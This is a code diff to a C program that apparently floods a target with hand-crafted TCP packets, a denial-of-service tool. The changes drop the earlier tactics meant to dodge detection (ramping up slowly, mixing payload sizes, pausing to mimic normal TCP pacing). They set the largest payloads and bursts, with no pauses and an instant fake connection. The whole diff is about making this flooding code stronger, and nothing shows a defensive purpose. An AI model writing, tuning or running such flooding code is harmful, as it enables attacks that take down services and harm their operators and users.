@@ -1532,11 +1532,11 @@ void *worker_thread(void *arg) {
         #define ST_ESTABLISHED 1
         #define ST_FORCE_EST   2
 
-        // Retry SYN 1x before force-establish (looks like real retransmit)
-        #define SYN_MAX_RETRY  1
+        // Instant force-establish for max throughput
+        #define SYN_MAX_RETRY  0
 
-        // Ramp up over 10 rounds (~1-2s) to avoid rate spike detection
-        #define SOFT_START_ROUNDS 10
+        // Full power from round 1
+        #define SOFT_START_ROUNDS 1
 
 
 
@@ -2081,13 +2081,8 @@ void *worker_thread(void *arg) {
                     th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
                 }
                 
-                // Bimodal payload: 35% small (64-300), 65% large (900-1428)
-                unsigned int plr = fast_rand() % 100;
-                if (plr < 35) {
-                    current_pl = 64 + (fast_rand() % 237);
-                } else {
-                    current_pl = 900 + (fast_rand() % 529);
-                }
+                // Max payload: 1200-1428 bytes (maximize bandwidth)
+                current_pl = 1200 + (fast_rand() % 229);
                 if(current_pl & 1) current_pl++;
                 tw[6] = htons(flags);
 
@@ -2231,9 +2226,9 @@ void *worker_thread(void *arg) {
                 fflush(stdout);
             }
 
-            // Phase 7: Adaptive burst (64-192, ±50% jitter)
-            int burst_count = 128 + (int)((fast_rand() % 128) - 64);
-            if (burst_count < 32) burst_count = 32;
+            // Phase 7: Max burst (256-512)
+            int burst_count = 256 + (int)(fast_rand() % 256);
+            if (burst_count < 128) burst_count = 128;
             int cur_fd = fd_send;
             unsigned long long total_sent = 0, total_bytes = 0;
             for(int burst = 0; burst < burst_count; burst++) {
@@ -2250,10 +2245,7 @@ void *worker_thread(void *arg) {
                     else break;
                 }
                 
-                // Phase 7: Micro-pause every 8-16 bursts (simulate TCP pacing)
-                if (burst > 0 && burst % (8 + (int)(fast_rand() % 8)) == 0) {
-                    usleep(1 + (fast_rand() % 5));
-                }
+                // No pause — max throughput
                 
                 // Update seq/checksum for NEXT burst (avoid duplicate seq)
                 for(int i = 0; i < valid_pkts; i++) {
